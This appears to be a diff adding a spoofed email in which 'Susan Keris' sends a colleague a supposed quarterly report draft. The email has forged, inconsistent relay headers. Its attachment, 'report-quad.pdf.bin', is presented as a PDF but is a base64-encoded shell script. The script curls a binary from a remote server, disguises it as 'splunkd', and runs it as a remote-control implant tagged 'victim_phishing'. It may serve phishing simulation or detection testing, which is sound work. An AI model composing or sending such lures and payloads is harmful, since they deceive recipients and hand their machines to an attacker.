@@ -1,0 +1,37 @@
+Return-Path: <noreply@superdomain.com>
+X-Original-To: mwalton@infotech.com
+Delivered-To: mwalton@infotech.com
+Received-SPF: Pass (protection.outlook.com: domain of superdomain.com designates 209.182.198.223 as permitted sender)
+Authentication-results: mx.infotech.com; dmarc=none (p=none dis=none) header.from=superdomain.net
+Received: by  207.236.185.34 with SMTP id y10csp847684pjm;
+        from mx.infotech.com
+        Mon, 14 Mar 2022 16:03:23 -0700 (PDT)
+Received: from mx.superdomain.net (pd5fe76.tokyff01.ap.so-net.ne.jp [202.213.254.118])
+        by mx.infotech.com with ESMTPS id s3-20020a170902c64300b00151f409112dsi14070489pls.343.2022.03.14.16.03.23
+        for <mwalton@infotech.com>; Fri, 20 Oct 2020 06:05:47 -0400 (EDT)
+Received: by mx.infotech.com (mx.infotech.com [207.236.182.130])
+        id BAFD05C8922; Fri, 20 Oct 2020 18:38:28 +0900 (JST)
+Received: by mx.superdomain.com (Postfix, from userid 12359)
+        id BAFD05C8922; Fri, 20 Oct 2020 18:38:28 +0900 (JST)
+To: mwalton@infotech.com
+From: "Susan Keris" <skeris@infotech.com>
+Date: Fri, 20 Oct 2020 18:38:28 +0900 (JST)
+Subject: Draft of third quarter report
+
+--Boundary_(ID_RSDuwbpOtVBL8yUI/P3XsQ)
+Content-Type: text/plain
+Hi Mark,
+Sending you draft of the earnings for the first quadrimester.
+
+Have a nice evening,
+Susan
+
+--Boundary_(ID_RSDuwbpOtVBL8yUI/P3XsQ)
+Content-Type: application/octet-stream; name=report-quad.pdf.bin
+Content-Transfer-Econding: base64
+Content-Disposition: attachment; filename=report-quad.pdf.bin
+
+IyEvYmluL3NoCnNlcnZlcj0iaHR0cDovLzE2OS4xMy4yLjI1Ojg4ODgiO2N1cmwgLXMgLVggUE9T
+VCAtSCAiZmlsZTpzYW5kY2F0LmdvIiAtSCAicGxhdGZvcm06bGludXgiICRzZXJ2ZXIvZmlsZS9k
+b3dubG9hZCA+IHNwbHVua2Q7Y2htb2QgK3ggc3BsdW5rZDsuL3NwbHVua2QgLXNlcnZlciAkc2Vy
+dmVyIC1ncm91cCB2aWN0aW1fcGhpc2hpbmcgLXYK
